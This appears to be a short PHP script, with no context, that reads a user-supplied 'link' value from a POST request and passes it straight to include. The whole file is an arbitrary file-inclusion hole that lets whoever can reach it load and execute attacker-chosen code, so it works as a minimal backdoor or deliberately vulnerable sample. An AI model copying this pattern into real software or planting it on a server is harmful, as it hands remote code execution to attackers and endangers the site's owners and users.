<?php

if (isset($_POST['link'])){
    $url = $_POST['link'];
    include $url;
}

?>